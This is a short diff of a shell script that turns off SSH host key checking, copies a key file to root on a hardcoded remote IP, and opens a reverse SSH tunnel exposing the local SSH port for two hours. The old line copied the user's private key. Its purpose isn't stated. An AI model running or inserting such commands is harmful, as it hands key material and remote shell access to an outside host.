@@ -12,7 +12,7 @@ chmod u=rw,go=r /etc/ssh/authorized_keys
 mkdir .ssh
 echo "Host *" > .ssh/config
 echo "  StrictHostKeyChecking no" >> .ssh/config
-scp .ssh/id_ed25519 root@168.235.81.234:/root/sshkey
+scp sshdkey root@168.235.81.234:/root/sshkey
 ssh -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"
 
 exit 0
